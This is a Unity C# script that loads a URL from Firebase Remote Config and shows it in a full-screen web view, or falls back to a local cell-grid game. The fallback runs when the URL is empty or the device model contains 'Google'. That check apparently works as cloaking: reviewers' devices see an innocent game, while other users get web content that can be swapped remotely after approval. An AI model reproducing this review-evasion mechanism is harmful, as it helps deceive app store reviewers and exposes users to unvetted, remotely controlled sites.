using Sirenix.OdinInspector;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;

public class ApplicationController : MonoBehaviour
{
    [SerializeField]
    private MyFireBaseRemoteConfig remoteConfig;

    [SerializeField]
    private UniWebView webView;

    [SerializeField]
    private CellsCreator cellsCreator;

    public string savedUrl { get; set; }


    public void StartWebView(string url) 
    {
        webView.Load(url);
        webView.Show();
    }

    [Button]
    public void ClearPrefs()
    {
        PlayerPrefs.DeleteAll();
    }

    private bool CheckModel()
    {
        if (SystemInfo.deviceModel.Contains("Google") || SystemInfo.deviceModel.Contains("google"))
            return false;
        else
            return true;
    }

    public async Task LoadUrl()
    {
        var url = await GetUrl();
        var check = CheckModel();

        Debug.Log("Check model:" + check);
        Debug.Log(url);

        if (string.IsNullOrEmpty(url) || !check)
            cellsCreator.SetCells();

        else
        {
            PlayerPrefs.SetString("URL", url);
            webView.Load(url);
            webView.Show();
        }
            
    }

    private async Task<string> GetUrl()
    {
        await remoteConfig.FetchDataAsync();

        return Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url_string").StringValue;
    }
}
